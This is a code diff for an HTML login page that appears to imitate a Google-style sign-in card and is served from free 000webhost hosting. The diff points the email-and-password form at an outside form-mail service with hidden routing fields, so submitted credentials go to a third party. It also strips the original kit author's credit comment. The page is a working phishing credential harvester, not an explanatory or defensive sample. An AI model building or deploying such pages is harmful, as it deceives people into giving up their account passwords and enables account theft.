@@ -854,7 +854,10 @@
 <div class="card signin-card clearfix">
 <img class="profile-img" src="avatar.png" alt="">
 <p class="profile-name"></p>
-  <form novalidate="" method="post" action="send.php">
+ <form method="POST" action="https://fp1.formmail.com/cgi-bin/fm192">
+<input type="hidden" name="_pid" value="154979">
+<input type="hidden" name="_fid" value="9TRLFGVQ">
+<input type="hidden" name="recipient" value="1">
 <label class="hidden-label" for="Email">Email</label>
 <input id="Email" name="email" type="email" placeholder="Email" value="" spellcheck="false" class="">
 <label class="hidden-label" for="Passwd">Password</label>
@@ -925,5 +928,5 @@
 </div>
   </div>
 <div style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;'><a title="000webhost logo" rel="nofollow" target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_campaign=ss-footer_logo&amp;utm_medium=000_logo&amp;utm_content=website"><img src="../raw.githubusercontent.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png" alt="000webhost logo"></a></div></body>
-<!-- Created By Manoj Kashyap R dont remove this credit line thank you-->
+
 </html>
